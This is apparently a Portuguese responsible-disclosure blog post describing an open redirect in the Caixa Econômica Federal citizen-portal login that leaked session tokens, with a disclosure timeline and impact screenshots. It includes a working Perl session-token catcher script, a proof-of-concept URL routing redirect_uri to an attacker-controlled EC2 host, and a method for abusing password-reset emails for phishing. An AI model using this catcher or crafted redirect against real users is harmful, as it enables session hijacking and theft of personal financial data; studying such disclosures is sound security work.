---
layout: content
title: 'Explorando um Open Redirect para Vazamento de Session Tokens'
description: ''
og_image: https://heitorgouvea.me/images/publications/caixa-account-takeover/email-poc.png
---

Tabela de conteúdo:
- [Sumário](#sumário)
- [As vulnerabilidades](#descrição)
- [Prova de Conceito](#prova-de-conceito)
- [Impacto](#impacto)
- [Conclusão](#conclusão)
- [Referências](#referências)

---

### Sumário

Essa publicação visa compartilhar uma vulnerabilidade de Open Redirect[1] encontrada no site da Caixa Econômica Federal, por meio da qual foi possível expor Tokens de Sessão de usuários.

Deve ser esclarecido que durante todos os testes, a única conta utilizada foi aquela para a qual se tinha autorização do titular e nenhuma outra conta ou informação de outros usuários foi acessada ou violada durante o desenvolvimento desta pesquisa e prova de conceito.

Linha do tempo:

```plaintext
01/01/2020: Descoberta da vulnerabilidade e criação da prova de conceito;
01/05/2020: A vulnerabilidade foi reportada;
01/07/2020: Confirmação da vulnerabilidade pela Caixa Econômica Federal;
01/10/2020: Correção da vulnerabilidade;
01/10/2020: Divulgação deste artigo técnico;
```

---

### As vulnerabilidades

Ao navegar pelas páginas web dos sistemas da Caixa Federal, foi identificada uma tela de autenticação que solicitava credenciais de acesso, identificadores como CPF, NIS, E-mail e uma senha. A página em questão é a tela de autenticação para acesso ao painel do Portal Cidadão.

![Caixa Federal Home Page Website](/images/publications/caixa-account-takeover/home-page.png)

-

A URL:

[http://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://acessoseguro.sso.caixa.gov.br]()

O último parâmetro da URL apresenta uma potencial vulnerabilidade de Open Redirect: &redirect_uri=. O valor inserido nesse parâmetro indica para qual URL o usuário será redirecionado ao final da atividade em questão, que neste caso é o login.

Para validar essa possibilidade, o valor do parâmetro &redirect_uri= na URL original foi alterado para o endereço da página inicial do Google. Por fim, ao preencher as credenciais válidas e realizar o login, é obtido o seguinte resultado:

<iframe width="100%" height="523" src="https://www.youtube.com/embed/d6EXPMQPcZw" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"></iframe>

-

Como demonstrado, a aplicação possui uma vulnerabilidade de Open Redirect. No entanto, há outro detalhe: durante o redirecionamento, um parâmetro adicional foi enviado, como pode ser observado na URL:

[https://google.com/?code=e629bd01-00cd-4b67-8f5d-f7fc50c2a9c7](https://google.com/?code=e629bd01-00cd-4b67-8f5d-f7fc50c2a9c7)

Após uma análise do parâmetro ?code= e da requisição original, foi possível validar que o valor desse parâmetro corresponde a um Token de Sessão[2].

Com essa conclusão, tornou-se evidente que essa vulnerabilidade possui uma alta criticidade, pois o usuário poderia ser vítima de um ataque, onde ocorre um redirecionamento para uma URL maliciosa na qual um atacante possui controle total e então realiza a captura do Token de Sessão. Ao fazer isso, o atacante obtém acesso à conta do usuário, violando a confidencialidade e a integridade de seus dados.

---

### Prova de conceito

Para comprovar a possibilidade do vazamento e captura do token, o seguinte código foi utilizado:

```perl
#!/usr/bin/env perl
# perl catcher.pl daemon -m production -l http://\*:8080

use 5.030;
use strict;
use warnings;
use Mojolicious::Lite -signatures;

get "/" => sub ($catcher) {
    $catcher -> res -> headers -> header("Access-Control-Allow-Origin" => "*");

    my $code = $catcher -> param("code");

    open (my $logs, ">>", "catcher.logs");
    print $logs "[+] - New Session Token -> '$code' has been catch.\n";
    close ($logs);

    return ($catcher -> render (
        text => "
            <script>window.location='https://acessoseguro.sso.caixa.gov.br/portal/login/?code=$code'</script>
        "
    ));

};

app -> start();
```

Este código é responsável por capturar e armazenar os Tokens de Sessão que são enviados para a URL "maliciosa" sob controle do atacante. Além de capturar o Token de Sessão e armazená-lo em um arquivo de log, este script redireciona o usuário novamente, desta vez, para a URL verdadeira fazendo com que se obtenha uma sessão genuína no sistema da Caixa Federal. Como tal, é improvável que um usuário comum saiba que está sendo enganado. A URL da prova de conceito é estruturada da seguinte maneira:

[https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://ec2-54-84-102-177.compute-1.amazonaws.com/](https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://ec2-54-84-102-177.compute-1.amazonaws.com/)

E o resultado obtido pode ser observado nesta gravação:

<iframe width="100%" height="523" src="https://www.youtube.com/embed/l2ZpggLSz_o" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"></iframe>

-

A superfície de ataque neste cenário ainda é restrita, exigindo que o usuário acesse a URL por conta própria (por meio de phishing ou engenharia social). 


Além dessa vulnerabilidade, foi descoberto que o valor do parâmetro &redirect_uri= presente na página também é utilizado no e-mail quando um usuário solicita a troca de senha por meio do botão “Registrar/Esqueci minha senha”. Para utilizar essa funcionalidade podemos preencher o e-mail ou o CPF da vítima. Após preencher as informações, um link com o valor malicioso injetado, para cadastrar a nova senha é enviado por e-mail.

Solicitando uma nova senha a partir da URL maliciosa, o conteúdo do e-mail será o seguinte:

![Caixa Federal Email Forgot Password](/images/publications/caixa-account-takeover/email-poc.png)

-

O e-mail é enviado por um sistema oficial da Caixa Federal. No entanto, ao observarmos o link, podemos ver que a URL está “infectada” com o link sob posse do atacante. Ao acessar o link e preencher a redefinição de senha, o redirecionamento ainda ocorre, resultando no vazamento do Token de Sessão.

Com isso, um atacante pode utilizar esse mecanismo para enviar e-mails solicitando a redefinição de senha em nome da Caixa Econômica Federal, conferindo maior credibilidade ao link malicioso. Esse ataque pode ser realizado em grande escala, pois basta ter o CPF do alvo para isso.

---

### Impacto

Caso esta vulnerabilidade fosse explorada, um atacante poderia visualizar informações confidenciais do usuário, como demonstrado abaixo:

![Caixa Federal Confidential Data User](/images/publications/caixa-account-takeover/confidential-data-user.png)

- Nome completo, CPF, data e hora do último acesso;

-

![Caixa Federal Confidential Data FGTS](/images/publications/caixa-account-takeover/confidential-data-fgts.png)

-

- Nome completo, número do PIS, empresa contratante, número da carteira de trabalho, conta FGTS, data de admissão, saldo em conta e os valores depositados em cada mês durante o período de trabalho na empresa;

![Caixa Federal Confidential User Andress](/images/publications/caixa-account-takeover/confidential-user-andress.png)


- Endereço completo do usuário (além disso, é possível editar esses dados, já que não é necessário utilizar senha);

-

---

### Conclusão

Um atacante poderia explorar as vulnerabilidades mencionadas acima e, assim, violar a confidencialidade de várias contas legítimas de usuários da Caixa Econômica Federal. 

Foi aconselhado à Caixa Econômica Federal conduzir uma investigação para validar se esse cenário de vulnerabilidades estava sendo explorado por agentes mal-intencionados na realização de golpes.

---

### Referências

- [1] [https://portswigger.net/kb/issues/00500100_open-redirection-reflected](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- [2] [https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
- [3] [https://www.owasp.org/index.php/Session_hijacking_attack](https://www.owasp.org/index.php/Session_hijacking_attack)